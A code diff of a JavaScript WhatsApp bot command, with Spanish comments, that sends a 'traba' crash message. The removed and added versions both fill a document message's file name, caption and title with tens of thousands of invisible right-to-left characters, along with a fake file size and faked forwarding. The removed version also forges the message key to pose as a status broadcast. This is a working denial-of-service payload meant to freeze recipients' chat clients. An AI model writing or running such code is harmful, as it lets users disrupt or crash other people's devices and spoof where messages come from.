@@ -1,50 +1,31 @@
 let handler = async (m, { conn }) => {
   try {
-    const invisible = '\u200F'.repeat(20000) // Puedes subir a 50000 si quieres probar más fuerte
-    const jpegFake = Buffer.from('') // Miniatura vacía (puedes agregar base64 si quieres miniatura real)
-
-    const fakeKey = {
-      remoteJid: 'status@broadcast',
-      fromMe: false,
-      id: m.id,
-      participant: '0@s.whatsapp.net',
-    }
-
-    const fakeDoc = {
-      documentMessage: {
-        title: invisible,
-        fileName: invisible,
-        caption: invisible,
-        mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
-        fileLength: 100000000,
-        pageCount: 1,
-        mediaKey: '',
-        fileSha256: '',
-        fileEncSha256: '',
-        directPath: '',
-        mediaKeyTimestamp: 1,
-        jpegThumbnail: jpegFake,
-        contextInfo: {
-          forwardingScore: 999,
-          isForwarded: true,
-          externalAdReply: {
-            title: invisible,
-            body: ' ',
-            thumbnail: jpegFake,
-            mediaType: 1,
-            renderLargerThumbnail: false,
-            showAdAttribution: false
-          }
+    const invisible = '\u200F'.repeat(45000) // invisible pero visible 👀
+    
+    await conn.sendMessage(m.chat, {
+      document: { url: 'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf' },
+      mimetype: 'application/pdf',
+      fileName: invisible,
+      caption: invisible,
+      fileLength: 9999999,
+      contextInfo: {
+        forwardingScore: 999,
+        isForwarded: true,
+        externalAdReply: {
+          title: invisible,
+          body: ' ',
+          thumbnail: null,
+          mediaType: 1,
+          renderLargerThumbnail: false
         }
       }
-    }
+    }, { quoted: m })
 
-    await conn.relayMessage(m.chat, fakeDoc, { messageId: m.key.id, messageKey: fakeKey })
-    await conn.sendMessage(m.chat, { text: '✅ Traba combinada enviada. Comprueba si se ve en el chat.' }, { quoted: m })
+    await conn.sendMessage(m.chat, { text: '✅ Mensaje visible enviado.' }, { quoted: m })
 
   } catch (e) {
     console.error(e)
-    await conn.sendMessage(m.chat, { text: '❌ Falló el envío de la traba combinada.' }, { quoted: m })
+    await conn.sendMessage(m.chat, { text: '❌ Falló el envío.' }, { quoted: m })
   }
 }
 
